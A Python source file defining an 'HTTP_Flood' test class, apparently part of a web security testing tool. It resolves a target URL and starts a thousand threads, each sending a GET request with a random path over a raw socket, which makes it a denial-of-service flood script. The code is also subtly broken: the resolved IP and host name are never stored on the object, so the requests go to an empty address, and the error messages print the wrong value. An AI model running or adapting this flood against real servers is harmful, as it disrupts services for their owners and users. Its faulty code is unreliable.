# -*- coding: utf-8 -*-
import concurrent.futures
import random
import socket
import string
import sys
import threading
import time

from Tests.Test import Test


class HTTP_Flood(Test):
    def __init__(self):
        super().__init__()
        self.thread_num_mutex = None
        self.cancel = False
        self.name = "HTTP Flood"
        self.future = None
        self.host_name = ""
        self.ip_ad = ""
        self.port_num = 8000
        self.nb_requests = 1000
        self.thread_num = 0

    def run(self, url: str):
        self.cancel = False
        self.thread_num = 0
        with concurrent.futures.ThreadPoolExecutor() as executor:
            self.future = executor.submit(self.start, url)
        self.future = None

    def start(self, url):
        if self.cancel:
            self.cancel_result(url)
            return

        # Convert FQDN to IP
        try:
            host_name = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
            ip_ad = socket.gethostbyname(host_name)
        except socket.gaierror:
            print(" ERROR\n Incorrect website, impossible to convert")
            return

        # Create a shared variable for thread counts
        self.thread_num_mutex = threading.Lock()
        # Generate thread/request
        all_threads = []
        for i in range(self.nb_requests):
            if self.cancel:
                self.cancel_result(url)
                return

            if self.cancel:
                self.cancel_result(url)
                return
            t1 = threading.Thread(target=self.attack)
            t1.start()
            all_threads.append(t1)

            # Time between each thread
            time.sleep(0.05)

        for current_thread in all_threads:
            if self.cancel:
                self.cancel_result(url)
                return

            if self.cancel:
                self.cancel_result(url)
                return
            current_thread.join()  # consecutive threads

    # Print thread status
    def print_status(self):
        self.thread_num_mutex.acquire(True)
        self.thread_num += 1
        # the output
        sys.stdout.write(f"\r {time.ctime().split()[3]} [{str(self.thread_num)}]")
        sys.stdout.flush()
        self.thread_num_mutex.release()

    # Generate URL Path
    def url_path(self):
        msg = str(string.ascii_letters + string.digits + string.punctuation)
        data = "".join(random.sample(msg, 5))
        return data

    # Execute the request
    def attack(self):
        if self.cancel:
            return
        self.print_status()
        var_url_path = self.url_path()

        # Create a raw socket
        dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            # Open the connection on that raw socket
            dos.connect((self.ip_ad, self.port_num))
            if self.cancel:
                return
            # Send the request according to HTTP spec

            byt = (f"GET /{var_url_path} HTTP/1.1\nHost: {self.host_name}\n\n").encode()
            dos.send(byt)
            dos.shutdown(socket.SHUT_RDWR)
        except socket.error:
            print(f"\n [ Server is down ]: {str(socket.error)}")
        finally:
            # Close socket
            dos.close()

        print(f"[#] Attack on {self.host_name} ({self.ip_ad} ) || Port: {str(self.port_num)} || # Requests: {str(self.nb_requests)}")

    def cancel_result(self, url):
        result = f'''HTTP flood for page {url}\n'''\
                '''Was canceled\n'''
        self.results.append((time.time(), result))
